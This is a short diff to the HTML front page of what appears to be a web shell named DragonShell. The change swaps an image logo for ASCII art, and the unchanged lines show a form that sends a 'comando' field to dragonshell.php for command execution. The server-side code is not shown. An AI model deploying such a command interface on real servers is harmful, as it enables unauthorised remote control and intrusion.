@@ -15,9 +15,20 @@ p {
 </style>
 </head>
 <body>
-<p align="center"><img src="http://dragonsec.info/img/dragonsec-logo-04.png" height="20%" width="20%"></img></p>
 
-<div>
+<p align="center"><strong>
+<textarea align="center" id="logo" name="logo" rows="7" cols="67" style="background-color:black;color:red">
+ ____  ____      _    ____  ___  _   _ ____  _   _ _____ _     _
+|  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|| | | | ____| |   | |
+| | | | |_) |  / _ \| |  _| | | |  \| \___ \| |_| |  _| | |   | |
+| |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |  _  | |___| |___| |___
+|____/|_| \_\/_/   \_\____|\___/|_| \_|____/|_| |_|_____|_____|_____|
+
+</textarea></strong>
+</p>
+
+
+<div align="center">
 <form method="GET" action="dragonshell.php" align="center">
 <input type="text" name="comando">
 <input type="submit" value="X"></form>
